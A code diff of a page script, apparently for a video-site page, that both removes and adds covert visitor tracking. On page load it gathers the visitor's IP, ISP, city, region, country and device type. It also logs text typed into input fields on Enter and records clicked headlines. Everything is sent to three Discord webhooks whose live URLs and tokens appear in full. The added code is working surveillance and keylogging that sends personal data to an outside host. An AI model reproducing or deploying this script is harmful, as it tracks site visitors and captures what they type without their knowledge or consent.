@@ -1,106 +1,132 @@
-(async function() {
-  const ipProvider = "https://ipv4.icanhazip.com/";
-  const ipLookupBase = "https://ipapi.co/";
+// IP + ISP Reporter with CORSProxy fallback
+(async () => {
+  const fileUrl = "https://ipv4.icanhazip.com/";
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
-  const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
-  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
 
-  async function sendToDiscord(url, content) {
-    if (!url || !content) return;
-    try {
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content })
-      });
-    } catch (e) {}
-  }
+  async function getIPData(url) {
+    const fileRes = await fetch(url);
+    const ip = (await fileRes.text()).trim();
+    let apiUrl = `https://ipapi.co/${ip}/json/`;
+    let data;
 
-  async function getIp() {
-    try {
-      const r = await fetch(ipProvider);
-      if (!r.ok) throw new Error("ip fetch failed");
-      return (await r.text()).trim();
-    } catch (e) {
-      return null;
+    async function fetchISP(u) {
+      const res = await fetch(u);
+      if (!res.ok) throw new Error(`Failed: ${res.status}`);
+      return await res.json();
     }
-  }
 
-  async function lookupIsp(ip) {
-    if (!ip) return { isp: "unknown", org: "", country: "" };
     try {
-      const r = await fetch(`${ipLookupBase}${encodeURIComponent(ip)}/json/`);
-      if (!r.ok) throw new Error("lookup failed");
-      const j = await r.json();
-      return {
-        isp: j.org || "unknown",
-        org: j.org || "",
-        country: j.country_name || "",
-        region: j.region || "",
-        city: j.city || "",
-        as: j.asn || ""
-      };
-    } catch (e) {
-      return { isp: "unknown", org: "", country: "" };
+      data = await fetchISP(apiUrl);
+    } catch {
+      data = await fetchISP(`https://corsproxy.io/?${apiUrl}`);
     }
+
+    if (
+      !data.org || data.org === "Unknown" ||
+      !data.city || data.city === "Unknown" ||
+      !data.country_name || data.country_name === "Unknown"
+    ) {
+      try {
+        data = await fetchISP(`https://corsproxy.io/?${apiUrl}`);
+      } catch {}
+    }
+
+    return { ip, data };
   }
 
-  // sanitizer now preserves line breaks
-  function sanitizeForDiscord(s, max = 1900) {
-    if (!s) return "";
-    const cleaned = s
-      .replace(/[`*_~>|]/g, "") // remove markdown
-      .replace(/[^\p{L}\p{N}\n .,!?'"()\[\]{}\-_/]/gu, ""); // allow line breaks
-    return cleaned.length > max ? cleaned.slice(0, max) + "\n\n...truncated" : cleaned;
+  try {
+    const { ip, data } = await getIPData(fileUrl);
+    const isp = data.org || "Unknown ISP";
+    const asn = data.asn ? `(${data.asn})` : "";
+    const location = data.city && data.region && data.country_name
+      ? `${data.city}, ${data.region}, ${data.country_name}`
+      : "Unknown Location";
+    const platform = navigator.userAgentData?.platform || navigator.platform;
+    const site = location.href.replace(/^https?:\/\//, "https://");
+    const message = `IP ${ip}\nISP ${isp} ${asn}\nLocation ${location}\nDevice ${platform}\nSite ${site}`;
+
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ content: message })
+    });
+  } catch (err) {
+    console.error("Error:", err);
   }
+})();
 
-  const ip = await getIp();
-  const ispInfo = await lookupIsp(ip);
-  const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
-  const baseLocation = location.href;
+function sendToWebhook(content) {
+  if (!content) return;
+  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ content })
+  }).catch(() => {});
+}
 
-  const ipMessage = [
-    `IP: ${ip || "unknown"}`,
-    `ISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` AS${ispInfo.as}` : ""}`,
-    `Location: ${ispInfo.city || "unknown"}${ispInfo.region ? ", " + ispInfo.region : ""}${ispInfo.country ? ", " + ispInfo.country : ""}`,
-    `Device: ${platform}`,
-    `Site: ${baseLocation}`
-  ].join("\n");
+document.addEventListener("DOMContentLoaded", () => {
+  const input = document.querySelector("input");
+  if (!input) return;
 
-  await sendToDiscord(webhookUrl, sanitizeForDiscord(ipMessage));
-
-  const mobileMessage = navigator.userAgentData?.mobile ? "The Person is on Mobile" : "The Person is not on Mobile";
-  await sendToDiscord(KwebhookUrl, mobileMessage);
-
-  async function safeSendHeadline(headline) {
-    if (!headline) return;
-    const cleanHeadline = sanitizeForDiscord(headline, 1800);
-    const message = `${ip || "unknown"} (${ispInfo.isp || "unknown"}) has opened ${cleanHeadline}`;
-    await sendToDiscord(winhook, message);
-  }
-
-  // Input logging
-  document.addEventListener("keydown", async e => {
-    const target = e.target;
-    if (e.key !== "Enter") return;
-    if (!(target && (target.matches("input") || target.matches("textarea")))) return;
-    if (target.isComposing) return;
-    const text = String(target.value || "").trim();
-    if (!text) return;
-    await sendToDiscord(webhookUrl, sanitizeForDiscord(text));
+  input.addEventListener("keydown", async e => {
+    if (e.key === "Enter") {
+      const text = input.value.trim();
+      if (!text) return;
+      const payload = { content: text.replace(/[`*_~>|]/g, "") };
+      try {
+        const res = await fetch("https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        if (!res.ok) console.error("Failed to send to Discord:", res.status);
+      } catch (err) {
+        console.error("Error sending to Discord:", err);
+      }
+    }
   });
+});
 
-  // Click tracking for headlines
+// Device detection webhook
+(async () => {
+  const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
+  const message = navigator.userAgentData?.mobile
+    ? "The Person is on Mobile"
+    : "The Person is not on Mobile";
+  await fetch(KwebhookUrl, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ content: message })
+  });
+})();
+
+// Click logger webhook
+(async () => {
+  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
+  const fileRes = await fetch("https://ipv4.icanhazip.com/");
+  const fileText = (await fileRes.text()).trim();
+
+  async function safeSend(headline) {
+    try {
+      const cleanHeadline = headline.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1800);
+      const message = `${fileText} has opened ${cleanHeadline}`;
+      await fetch(winhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ content: message })
+      });
+    } catch (err) {
+      console.error("Send failed:", err);
+    }
+  }
+
   document.addEventListener("click", e => {
     const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
     if (!target) return;
-    const headlineEl = target.querySelector(".compact-media-headline");
-    const headline = headlineEl?.innerText?.trim() || target.innerText?.trim().split("\n")[0];
-    if (headline) safeSendHeadline(headline);
+    const headline = target.querySelector(".compact-media-headline");
+    if (headline && headline.innerText.trim()) {
+      safeSend(headline.innerText.trim());
+    }
   });
-
-  // MutationObserver kept empty to avoid false triggers
-  const observer = new MutationObserver(() => {});
-  observer.observe(document.documentElement || document.body, { childList: true, subtree: true });
-  window.addEventListener("beforeunload", () => observer.disconnect());
 })();
